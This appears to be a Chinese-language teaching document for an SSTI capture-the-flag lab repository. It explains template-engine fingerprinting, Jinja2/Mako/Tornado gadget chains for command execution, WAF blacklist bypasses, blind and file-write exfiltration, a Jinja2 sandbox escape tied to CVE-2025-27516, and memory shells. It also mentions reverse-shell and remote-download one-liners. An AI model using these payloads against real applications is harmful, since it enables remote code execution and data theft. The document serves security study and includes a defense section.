# SSTI 知识点（从零开始）

> 本文是**原理文档**：讲清楚「为什么这些 payload 长得是这样」。
> 逐关速查表在 [`SOLUTIONS.md`](SOLUTIONS.md)，内存马专题在 [`MEMSHELL.md`](MEMSHELL.md)。
>
> **可信度约定**：凡标 ✅ 的 payload / 结论，都在本仓库的容器里实际执行过
> （`POST /api/render`，`mode=god`，镜像 `labs/0x-*`）；
> 凡标「未验证」的，是业界通行做法但本仓库没有实测，请自行在目标上确认。
> 引擎指纹表里不属于本仓库的引擎（ERB / Twig / FreeMarker / Velocity 等）
> 一律标「未在本仓库验证」。

---

## 1. 什么是 SSTI

模板引擎本来是「用数据填模板」的工具。当**用户输入被当成模板的一部分**去编译/求值时，
用户就能写模板语法，进而执行引擎允许的一切表达式。

```python
render_template_string("Hello " + user_input)     # ❌ 用户输入进了模板源码
render_template_string("Hello {{ name }}", name=user_input)   # ✅ 用户输入只是数据
```

关键分界：**数据要留在数据的位置**。一旦用户输入进入了「模板源码」这个位置，
就不再是 HTML 转义能解决的问题了 —— 你给的不是字符串，是**代码**。

本仓库的每一关都是这个模式的变体：`/api/render` 把你提交的 `template`
交给对应引擎，`Level.render()` 负责「先过 WAF，再交给引擎」。

---

## 2. 引擎指纹：第一步永远是「这是哪个引擎」

模板语法在不同引擎间**互相冲突**。同一个 `{{7*7}}`：

- 在 Jinja2 里求值 → `49`
- 在 Tornado 里也求值 → `49`（本仓库 lab 04 实测 ✅）
- 在 FreeMarker 里是原样输出（FreeMarker 用 `${}`）
- 在 Handlebars 里也是 `{{ }}`，但**不能做算术**，输出空串

### 2.1 语法面探测表

| 探测载荷 | 若被求值，说明是 | 本仓库验证情况 |
|----------|------------------|----------------|
| `{{7*7}}` → `49` | Jinja2 / Twig / Nunjucks / Tornado / Django(需过滤) | ✅ lab 02 / 04 |
| `{{7*'7'}}` → `7777777` | **Jinja2**（Python 的 `str*int`） | 未验证 |
| `{{7*'7'}}` → `49` | **Twig**（PHP 里 `'7'` 转数字） | 未验证（非本仓库引擎） |
| `${7*7}` → `49` | Mako / FreeMarker / JSP EL / Thymeleaf | ✅ lab 03（Mako）；其余未验证 |
| `<%= 7*7 %>` → `49` | ERB (Ruby) / EJS / ASP | 未验证（非本仓库引擎） |
| `${{7*7}}` → `49` | Handlebars 系（外层 `{{}}` 先被剥掉） | 未验证 |
| `#{7*7}` / `*{7*7}` | Ruby / Thymeleaf / SpringEL | 未验证 |
| `{% ... %}` 能执行 | Jinja2 / Tornado / Twig / Nunjucks | ✅ lab 02 / 04 |
| `% for i in ...` 行语法 | Mako / Bottle / Tornado(部分) | ✅ lab 03（Mako） |
| `<% ... %>` 代码块 | Mako / ERB / ASP | ✅ lab 03（Mako） |
| `${...?new()}` / `${...?upper_case}` | FreeMarker（内置函数用 `?`） | 本仓库 lab 08 源码里是 FreeMarker，但未在本机跑通构建 |
| `@Model.` / `T(...)` | Thymeleaf / SpringEL | 未验证（lab 08 第二条路径） |

### 2.2 `49` vs `7777777`：Jinja2 与 Twig 的分水岭

两个引擎都以 `{{ }}` 为定界符、都支持算术，但：

- **Jinja2（Python 语义）**：`'7'` 是字符串，`7 * '7'` 是字符串重复 → `7777777`
- **Twig（PHP 语义）**：`'7'` 在算术上下文里被转成数字 → `49`

实测建议：**两个都发一遍**，看哪个成立。反过来，`{{7*7}}` 都是 `49`，无法区分。
（本仓库没有 Twig 靶场，此条为通用知识，未在本仓库验证。）

### 2.3 更可靠的指纹思路

不要只依赖一条载荷。优先找**引擎独有语法**：

- Jinja2：`{{ cycler.__init__ }}`（暴露 Python 对象）、`{{ ''.join }}` 报 `UndefinedError`
- Mako：`<%! %>` 模块级代码、`${}` 里能写完整 Python（`lambda`、列表推导）
- Tornado：`{% import os %}` **直接导入模块**、默认命名空间里有 `escape` / `datetime`
- FreeMarker：`${7*7}` 之外还有 `<#assign x=1>`、`${"a"?upper_case}`
- Twig：`{{_self}}`、`{{7//2}}`（Twig 用 `//` 整除）

> 本仓库 lab 04 的 `{{ escape }}` 实测输出 `<function xhtml_escape at 0x...>` ——
> 「默认命名空间里有没有某个名字」本身就是极强的指纹。

---

## 3. 通用利用模型：三段式

所有 SSTI RCE 都可以拆成三段：

```text
① 拿到一个对象            →  ② 从对象走到「调用能力」  →  ③ 调用危险函数
   （payload 的起点）         （属性/下标/过滤器链）        （os / subprocess / open）
```

- **① 起点**：模板上下文里注入的变量（`config` / `request` / `session` / `lipsum` /
  `cycler` / `escape` / `handler` / `datetime` …），或语言内置（`open` / `chr` /
  `__import__`）。Mako / Tornado 因为 `${{}}` 里是原生 Python，起点天然更多。
- **② 通路**：属性访问（`.`）、下标（`[]`）、过滤器（`|attr`）、内置函数
  （`getattr` / `__getitem__`）、以及各种「绕过字符黑名单」的变形。
- **③ 终点**：`os.popen` / `os.system` / `subprocess.check_output` /
  `subprocess.getoutput` / 内置 `open` / `__import__` / `eval` / `exec`，
  或者 `write` 一个文件再经 HTTP 取回。

**WAF 的作用点**就在 ①②③ 三段上：禁字符（三段都受影响）、禁子串（禁的是「名字」）、
禁前缀（改的是起点）。所以「绕过」的本质是**换一条同样语义的路**，不是硬碰。

---

## 4. Flask/Jinja2 的 gadget 目录

### 4.1 为什么是这些名字

Flask 的 `render_template_string` 会把一大堆对象注入模板全局命名空间。
它们的共同特征是：**都是一个 Python 函数或对象，而 Python 函数有 `__globals__`**，
`__globals__` 里通常就有 `os` 或 `__builtins__`。

| 起点 | 访问方式 | 为什么有用 |
|------|----------|-----------|
| `config` | `{{config}}` | Flask 配置对象；`config.__class__.__init__.__globals__` 一路到 `os` |
| `lipsum` | `{{lipsum.__globals__}}` | 实为 `jinja2.utils.generate_lorem_ipsum`，其 globals 里**直接有 `os`** |
| `cycler` | `{{cycler.__init__.__globals__}}` | `jinja2.utils.Cycler`，`__init__` 的 globals 同样来自 `jinja2.utils` |
| `joiner` | `{{joiner.__init__.__globals__}}` | 同上（`jinja2.utils.Joiner`） |
| `namespace` | `{{namespace.__init__.__globals__}}` | 同上（`jinja2.utils.Namespace`） |
| `url_for` | `{{url_for.__globals__}}` | 实为 Flask 的函数，globals 是 Flask 模块，能拿到 `current_app` / `request` |
| `get_flashed_messages` | `{{get_flashed_messages.__globals__}}` | 同上，Flask 模块的 globals |
| `request` | `{{request}}` | Werkzeug Request；`request.application.__globals__` 是 Werkzeug 的 globals |
| `''`（字符串） | `{{''.__class__.__mro__[1].__subclasses__()}}` | 经典「子类枚举」路线：从 `object` 的子类里找 `os._wrap_close` / `subprocess.Popen` / `warnings.catch_warnings` |
| `self` | `{{self.__init__.__globals__}}` | Jinja 的 TemplateReference；`config`/`self` 常被 WAF 置空（见 4.3） |

> 本仓库实测：lab 01 的 `{{lipsum.__globals__}}` 返回的字典里有
> `'os': <module 'os' (frozen)>`，所以 `lipsum` 是**最短**的一条链 ✅。
> lab 02 的 `{{lipsum.__globals__.os.popen('cat /flag').read()}}` 也被
> `scripts/verify_labs.py` 断言过 ✅。

### 4.2 三条典型链（本仓库内已验证）

```jinja2
# 链 A：lipsum（最短，jinja2.utils 的 globals 里直接有 os）
{{lipsum.__globals__.os.popen('cat /flag').read()}}

# 链 B：cycler（等效，lab 07 的 verify_memshell.py 用的就是它）
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}

# 链 C：builtins（当 os 这个「名字」被禁时改走 __import__）
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

子类枚举路线（当上面这些起点全被置空时才需要）：

```jinja2
{{''.__class__.__mro__[1].__subclasses__()}}     # 先列出所有子类
# 再按序号取到 os._wrap_close / subprocess.Popen / warnings.catch_warnings 之类
```

**它为什么通常被放在最后**：`__subclasses__()` 的返回长度和顺序**依赖当前进程
导入了哪些模块**，序号不稳定，可移植性差。先用 `lipsum` / `cycler` 这类稳定链。

### 4.3 起点被「置空」了怎么办

有些 WAF 不改你的 payload，而是**在你前面拼一段代码**：

```jinja2
{% set config=None %}{% set self=None %}     # lab 02 id9 / lab 04 id9，实测
% if False:\n% endif\n                       # lab 03 id9（Mako 行语法），实测
```

要点：**被置空的是「变量」，不是「类型」也不是「命名空间」**。
`config` 拿不到了，但 `lipsum` / `cycler` / `joiner` / `namespace` / `request` /
`url_for` 都还在 —— 直接换入口即可。

实测（lab 04 id9）：`{{ config }}` → `None`，`{{ escape }}` 正常，
`{{ open('/flag').read() }}` → `flag{doc_probe}` ✅。

### 4.4 字符串构造：绕开「子串黑名单」的核心手艺

黑名单匹配的是**连续子串**。所以最有效的绕过不是编码，而是
**让那个子串在源码里物理上不存在**。

| 手法 | 写法 | 结果 | 备注 |
|------|------|------|------|
| 波浪号拼接（Jinja） | `'_'~'_'` | `__` | ✅ lab 01 |
| 相邻字面量隐式拼接（Jinja） | `'_''_'` | `__` | ✅ Fenjing 生成物 |
| `+` 拼接（Python 系） | `chr(47)+chr(102)` | `/f` | ✅ lab 03 / 04 |
| 反转 + 切片 | `'galf/ tac'[::-1]` | `cat /flag` | ✅ lab 01（Fenjing 生成） |
| `chr()` 逐字节 | `chr(47)` | `/` | ✅ lab 03 / 04 |
| 从上下文取 | `request.args.x` | 任意串 | lab 02 id4；注意 id10 起 `request` 被禁 |
| `\|join` 替代 `+` | `['a','b']\|join` | `ab` | 未在本仓库实测 |

于是「禁 `__`」不再是禁「魔术属性」，只是禁了「直接写魔术属性」：

```jinja2
{{()|attr('_'~'_'~'class'~'_'~'_')}}        # lab 02 id5 的思路
{{lipsum['_'~'_'~'globals'~'_'~'_']}}       # ✅ lab 01 实测
```

### 4.5 属性访问的三张面孔

| 写法 | 语法 | 被什么规则挡住 |
|------|------|----------------|
| `obj.attr` | 点号语法糖 | 禁 `.` |
| `obj['attr']` | 下标 | 禁 `[` `]` |
| `obj\|attr('attr')` | Jinja 过滤器 | 禁 `attr` 子串（注意：**`getattr\s*\(` 正则拦不住 `\|attr(`**） |
| `getattr(obj, 'attr')` | 内置函数 | 禁 `attr` 子串 / `getattr(` 正则 |

一张表说明白「为什么每关只加一条规则却总能绕」：**同一个语义至少有四条写法**，
封一条只损失一条路。

---

## 5. 每一类 WAF 规则为什么必然被绕过

| 规则类型 | 它拦的是什么 | 为什么必被绕过 |
|----------|--------------|----------------|
| 子串黑名单 | 具体的「名字」（`__`、`os`、`flag`…） | 字符串可以在运行时**拼出来**；黑名单只约束源码文本，不约束运行时值 |
| 字符黑名单（`.` `[]` `'` `_` `+` 数字） | 具体的「语法字符」 | 同一语义有多条语法路径（`|attr` / `getattr` / `[]` / `chr()` / `True` / `len()`），封一条丢一条 |
| 正则（`getattr\s*\(`） | 特定调用**形态** | 换个等价函数名或换个调用写法就不匹配（`|attr('get')('o'~'s')`） |
| 前缀拼接（`{% set config=None%}`） | **入口变量** | 入口不止一个；置空变量不等于删除命名空间 |
| 定界符黑名单（`{{`、`${`） | **输出语法** | 引擎通常还有别的求值面（`{% print %}` / `<% %>`），且「盲」不等于「不可利用」 |
| 长度/次数限制 | 输出体积 | 分片带出（多次请求） |

**一条经验**：黑名单型 WAF 的强度上限，由「该语义在语言里有多少等价写法」决定。
模板引擎是完整编程语言，等价写法近乎无限，所以黑名单只能提高成本，不能根治。
白名单（沙箱）才是正确的防御方向 —— 那也是 lab 05 要练的东西。

---

## 6. 盲注与侧信道

当服务端**不回显渲染结果**时，payload 依然被执行了，只是你看不见。这时要把
「读取数据」变成「可观测的差异」。本仓库 `Level.echo_mode` 把这件事做成了维度：

| `echo_mode` | 响应长什么样 | 你的信道 |
|-------------|--------------|----------|
| `full` | 真实渲染结果 | 直接读 |
| `bool` | 恒定 `correct` / `wrong` | **布尔**：让条件决定渲染是否抛异常 |
| `none` | 恒定字符串（默认 `ok`） | **副作用**：写文件 / 改变进程状态 / 时间差 |
| `file` | 不回显，但要求你写到可访问目录 | **HTTP 侧信道** |

约定（`docs/API.md` §6 第 1 条）：**盲关只有一个成功信号 —— `ok`**；
`echo_mode="none"` 时 `output` 恒定，不要用它判断结果。

### 6.1 布尔信道（`echo_mode="bool"`）

实测（lab 02 id2 / lab 03 id2 / lab 04 id2）：

```jinja2
hello                     → ok:true,  output:"correct"
{{ 1/+ }}                 → ok:false, output:"wrong"     # 语法错误也算失败
```

于是「读一个字符」变成「构造一个能/不能渲染的模板」：

```jinja2
# 伪代码：如果 flag 的第 i 个字符等于 c，就让它炸
{% if <条件> %}{{ 1/0 }}{% endif %}
```

注意：`echo_mode="bool"` 的关卡里，**语法错误也返回 `wrong`**，所以你可以用
「模板能否编译」本身当信道（Mako / Tornado 是编译型引擎，这点特别明显）。

### 6.2 时间信道

没有 `correct/wrong`、也没有任何回显时，还可以用**执行时长**当信道：

```jinja2
{% if <条件> %}{% for _ in range(10000000) %}{% endfor %}{% endif %}
```

（本仓库没有专门的 time-based 关卡；这条是通用手法，**未在本仓库验证**。）

### 6.3 文件回显（无回显 + 不出网的中间态）

最朴素也最有效：**把命令输出写进 Web 可访问的目录，再用普通 HTTP GET 取回**。

lab 07 step3 实测 ✅：

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set _=u.__import__('os').popen('cat</flag>/app/echo/exfil.txt')%}
```

然后 `GET /echo/exfil.txt` → `flag{...}`。

两个细节：

- `cat</flag>/app/echo/x` 用**重定向**代替空格，整个 payload 不需要任何空白
  —— 因为投递点是 HTTP `Host` 头，头字段值里不能有空格。
- 写文件是**一次性、有痕迹**的。想「可反复调用、不落文件」，就要走内存马
  （见 [`MEMSHELL.md`](MEMSHELL.md)）。

---

## 7. 沙箱逃逸原理（lab 05 的实测结论）

Jinja2 的 `SandboxedEnvironment` 不是「禁止执行」，而是**在属性访问上做了白名单**：

- `is_safe_attribute(obj, attr)`：`__class__` / `__globals__` / `__subclasses__` 之类
  以 `_` 开头的名字一律被判 unsafe，返回 `UnsafeUndefined`
  （单独渲染成空串，继续往下取属性才抛 `SecurityError` / `UndefinedError`）
- `SandboxedEnvironment` 允许修改对象；`ImmutableSandboxedEnvironment` 连修改也禁止
  （`modifies_known_mutable`：list / set / dict / deque 的 `append` `clear` `pop`
  `update` `sort` … 全部 `SecurityError`）

本仓库的沙箱渲染器（`shared/ssti_core/engines/jinja.py` 的 `_sandbox_environment`）
注册了 `config` / `session` / `request` / `url_for` / `get_flashed_messages` 作为起点；
lab 05 的 `app.py` 再额外注册一个业务回调 `helper`。沙箱类型由关卡
`options={"sandbox": "default" | "immutable"}` 选择。

### 7.1 ⚠️ 先纠正一个流传很广的错误结论

**「沙箱拦点号，但 `|attr('__class__')` 能绕过」是过时信息。**

Jinja2 自 **2.11.3** 起，`filters.do_attr` 在 `environment.sandboxed` 时会调用
`is_safe_attribute()`；也就是说 `|attr` 和点号访问**受同一套检查**。
本仓库实测：`{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}`
在 **3.1.4 / 3.1.5 / 3.1.6 上全部失败**。

四条属性通路**全部**过沙箱，一个都别指望：

| 通路 | 结果 |
|------|------|
| 点号 `x.__class__` | `UnsafeUndefined`（渲染成空串） |
| 过滤器 `x\|attr('__class__')` | 同上（2.11.3 起同样受检） |
| `x\|map(attribute='__class__')` | `[Undefined]` |
| 字面量 `'{0.__class__}'.format(x)` | 空串（`wrap_str_format` 包装了 `str.format`） |

**结论：任何写在 2.11.3 之前的沙箱逃逸 writeup，在今天的 Jinja2 上都不成立。**

### 7.2 仍然有效的原语：CVE-2025-27516（lab 05 的考点）

`|attr('format')` 在**特定版本**上能拿到**未经沙箱包装**的 `str.format`，
而 `str.format` 的格式字段名（`{0.xxx}` / `{0[xxx]}`）是 **CPython 在 C 层解析**的，
不经过 Jinja 的任何检查 —— 于是可以做**只读的属性遍历**。

```jinja2
{{ ('{0.__class__}'|attr('format'))(()) }}                      → <class 'tuple'>
{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }} → 把内存里的 flag 打出来
```

**版本边界很反直觉（本仓库逐条实测，务必按这个来）**：

| Jinja2 | 结果 |
|--------|------|
| 3.1.4 | ❌ `SecurityError: access to attribute '__globals__' of 'function' object is unsafe.`（原语尚不存在） |
| **3.1.5** | ✅ `<class 'tuple'>` —— **唯一可用版本** |
| 3.1.6+ | ❌ 已修复：访问 `format` / `format_map` 返回 `SandboxedFormatter` |

所以 lab 05 的 `requirements.txt` 写的是**精确锁** `Jinja2==3.1.5`。
写成 `>=3.1.4,<3.1.6` 是错的 —— 它在语义上把 3.1.4 也算作可用，而 3.1.4 同样无解。

**这条原语的能力边界**：只能把属性路径**打印成字符串**，**不能调用**
（`format` 只做取值不做调用），因此**拿不到 RCE、读不到 `/flag` 文件**。
lab 05 因此把 flag 作为教学装置放进服务端内存（应用模块全局 `SITEDATA['flag']`，
经 `helper.__globals__` 可达）；想要真实 RCE 请去 lab 07 / 08。

### 7.3 沙箱题的通用思路

1. 先确认沙箱**到底拦了什么**（是属性名？是修改？是调用？），别套用记忆中的链；
2. 遍历所有「能替你取值/求值」的**间接通道**：`str.format` / `%` 格式化、
   `|map(attribute=)`、`|selectattr`、`|sort(attribute=)`、`|join`、
   以及上下文里业务对象的类型；
3. 这些间接通道是否受沙箱管辖，取决于**该版本的实现细节** ——
   所以要么实测，要么锁死版本（lab 05 的做法）；
4. 沙箱逃逸本质仍是「白名单 vs 等价语法」的博弈，只是对手从正则变成了代码里的 `if`。
   既然是代码，就会有漏掉的等价语法 —— CVE-2025-27516 就是这么来的。

---

## 8. 不出网（no-egress）利用专题

### 8.1 出网被切断时，哪些经典操作会失效

lab 07 的 `entrypoint.sh` 在容器内执行（实测生效 ✅）：

```sh
iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP      # 丢弃新建的对外 TCP 连接
iptables -A OUTPUT -o eth0 -p udp --dport 53 -j DROP # 丢弃 DNS 查询
```

后果：

| 经典手法 | 为什么失效 |
|----------|-----------|
| 反弹 shell（`bash -i >& /dev/tcp/...`） | 目标主动发起的 TCP 首包是 SYN，被 DROP |
| DNSLog 外带 | UDP/53 被 DROP；TCP DNS 也要新建连接 |
| 外连下载 payload / `curl vps/x.sh` | 同反弹 shell |
| 反向 XXE / 任何「目标连回来」 | 同上一类 |
| 时间信道（等外部服务超时） | 超时点可能不可控，但**仍可用**（本地计算耗时不受影响） |

而**入站端口照常工作**：宿主机映射进来的连接，其**回包不是 SYN**，所以
`docker run -p 8097:5000` 之后你照样能从宿主机访问。这一点是内存马能成立的前提。

### 8.2 内存马：把能力挂到已有的入站通道上

核心思路反转：

```text
反弹 shell：让「目标」连「我」  → 需要出网 → 被切断
内存马    ：把代码挂到「目标已经在服务的入站 HTTP 通道」上 → 不需要出网
```

对 Flask 是改 `app.url_map` + `app.view_functions`（路由型），或往
`app.before_request_funcs[None]` 追加函数（Filter 型）；
对 Java/Tomcat 是往 `StandardContext` 注册 `Filter`（lab 08）。

关键前提与坑：

- Flask 的 `add_url_rule` / `before_request` 带 `setupmethod` 保护，
  **应用处理过第一个请求后会直接抛 `AssertionError`** —— 必须绕过公开 API、
  直接改底层数据结构。这正是「内存马」区别于「正常注册路由」的地方。
- `__import__('a.b')` 返回的是**顶层包 `a`**，不是子模块 `a.b`
  —— 所以 `__import__('werkzeug.routing').Rule` 会失败，要从已有实例反推类。
- 内存马**不落文件、进程重启即消失**，这是它相对「写文件回显」的优势。

完整的逐步讲解、两个已验证 payload、以及 Java 对照，见 [`MEMSHELL.md`](MEMSHELL.md)。

### 8.3 不出网时的三档能力（从低到高）

| 档位 | 手段 | 可复用性 | 痕迹 | 本仓库 |
|------|------|----------|------|--------|
| 1 | 命令回显在响应里 | — | 无 | 有回显的关卡 |
| 2 | 写文件到 Web 目录 + HTTP 取回 | 一次性 | 落文件 | lab 07 step3 ✅ |
| 3 | 内存马（路由 / Filter） | **可反复调用** | 仅内存 | lab 07 step4 ✅、lab 08 |

---

## 9. 防御视角（写题的人也该知道）

| 防御 | 有效性 | 说明 |
|------|--------|------|
| 不给用户输入进模板源码的机会 | ✅ 根治 | 数据永远当数据传（`render_template(..., name=user_input)`） |
| 沙箱环境（`SandboxedEnvironment`） | ⚠️ 提高成本 | 只挡属性访问白名单；历史上多次被绕过（lab 05 就是练这个） |
| 黑名单 WAF | ❌ 只能提成本 | 等价语法太多，见 §5 |
| 白名单字符集 | ⚠️ 可行但难用 | 会误伤正常模板；且要覆盖所有语法面 |
| 限制出网 | ✅ 有价值 | 但挡不住内存马与写文件回显 —— **本仓库两个内存马靶场就是在演示这一点** |
| 最小权限运行 | ✅ | 读不到 `/flag` 时，RCE 也拿不到东西 |

**结论**：把「不出网」当唯一防线是不够的。真正有效的是「用户输入永不进入模板源码」
+ 最小权限 + 沙箱，三者叠加。

---

## 10. 参考

- [OWASP · Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [PortSwigger · SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks · SSTI (Jinja2)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Jinja2 · Sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [Mako 文档](https://docs.makotemplates.org/) · [Tornado template](https://www.tornadoweb.org/en/stable/template.html)
- [Fenjing](https://github.com/Marven11/Fenjing)
- 本仓库：[`SOLUTIONS.md`](SOLUTIONS.md) · [`MEMSHELL.md`](MEMSHELL.md) · [`API.md`](API.md) · [`DEPLOY.md`](DEPLOY.md)
